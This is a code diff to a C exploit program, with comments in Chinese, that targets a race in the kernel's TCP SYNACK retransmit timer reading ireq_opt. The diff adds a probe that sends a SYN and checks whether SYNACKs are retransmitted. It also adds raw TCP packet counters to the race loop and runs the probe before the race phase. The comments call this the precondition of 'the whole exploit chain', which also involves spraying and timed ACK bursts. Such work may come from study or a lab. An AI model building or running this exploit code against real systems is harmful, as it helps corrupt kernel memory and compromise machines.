@@ -1463,6 +1463,44 @@ struct race_slot {
     uint32_t peer_seq;
 };
 
+/* 重传验证：发一个 SYN，然后什么都不做，等 1.5 秒看内核会不会自己重传。
+ *
+ * 这是整条利用链的前提。如果内核连一次 SYNACK 重传都不做，那么
+ * 「定时器在软中断里读 ireq_opt」这个窗口根本不存在，后面所有
+ * 关于竞态的调参都是空转。
+ *
+ * 这个探针不喷淋、不发 ACK，纯粹观察，结论最干净。
+ */
+static void probe_synack_retransmit(void) {
+    uint16_t sport = (uint16_t)(30000 + (rand() % 20000));
+    uint32_t isn = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
+    uint8_t pkt[128];
+    size_t len = build_pkt(pkt, sport, isn, 0, 0x02);
+
+    unsigned long synack_before = g_rx;
+    unsigned long raw_before = g_tcp_other;
+
+    tx(pkt, len);
+
+    say("[rtx] 发一个 SYN（sport=%u isn=%#x），然后静等 1.5 秒", sport, isn);
+    for (int i = 0; i < 150; i++) {
+        usleep(10 * 1000);
+        if (g_rx - synack_before >= 2) break;   /* 首次 + 至少一次重传 */
+    }
+
+    unsigned long got = g_rx - synack_before;
+    unsigned long raw = g_tcp_other - raw_before;
+    say("[rtx] 1.5 秒内收到 %lu 个 SYNACK（原始 TCP 包 %lu 个）", got, raw);
+    if (got >= 2) {
+        say("[rtx] 内核会重传 SYNACK ✅ 定时器路径可用，竞态窗口存在");
+    } else if (got == 1) {
+        say("[rtx] 只收到首次 SYNACK，1.5 秒内没有重传 ❌");
+        say("[rtx] → 重传定时器不工作，教程那条竞态窗口在这颗内核上不成立");
+    } else {
+        say("[rtx] 连首次 SYNACK 都没收到（通道问题，不是重传问题）");
+    }
+}
+
 static int race_batch(struct race_slot *slots, int want, struct synack *out) {
     /* 先把 20 个 SYN 一口气全发出去，再统一收 SYNACK。
      *
@@ -1567,6 +1605,9 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * 是个瞬间，稀稀拉拉地打，绝大多数 ACK 都落在窗口外。内层连打能让
      * 「ACK 恰好落在定时器读内存的那一刻」的概率提高近一个数量级，
      * 而代价只是多几次 sendto。 */
+    /* 用最底层的计数：所有从 tun 读到的 TCP 包，不做任何过滤。
+     * g_rx 要过好几道过滤才自增，如果重传包的地址/端口稍有偏差就统计不到。 */
+    unsigned long raw_before = g_tcp_other;
     unsigned long rx_before = g_rx;
     for (int round = 0; round < 300; round++) {
         for (int k = 0; k < 8; k++) {
@@ -1575,15 +1616,19 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
         usleep(1000);
     }
     unsigned long rx_during = g_rx - rx_before;
+    unsigned long raw_during = g_tcp_other - raw_before;
 
     /* 这段时间收到的包数就是「定时器有没有重传」的硬指标。
      * 每个四元组若重传一次，我们就会多收到一个 SYNACK；n 个四元组
      * 全都没重传的话，这个数应该接近 0。 */
     if (rx_during > 0) {
-        say("[race] ACK 扫描期间收到 %lu 个包（%d 个四元组，平均 %.1f/个）",
+        say("[race] ACK 扫描期间收到 %lu 个 SYNACK（%d 个四元组，平均 %.1f/个）",
             rx_during, n, (double)rx_during / (n > 0 ? n : 1));
+    } else if (raw_during > 0) {
+        say("[race] 有 %lu 个 TCP 包回来，但没有一个是匹配的 SYNACK",
+            raw_during);
     } else {
-        say("[race] ACK 扫描期间一个包都没收到 —— 重传定时器没有触发");
+        say("[race] ACK 扫描期间连一个 TCP 包都没有 —— 重传定时器没有触发");
     }
 
     /* 收这一批的回包，只认本批的四元组。
@@ -1773,6 +1818,9 @@ static int phase_race(struct hit_ctx *hit) {
         g_clear_race = 0;
         g_mismatch = 0;
     }
+
+    /* 先单独验证重传到底会不会发生。不喷淋、不发 ACK，纯观察。 */
+    probe_synack_retransmit();
 
     say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
         RACE_BATCH, g_rounds);
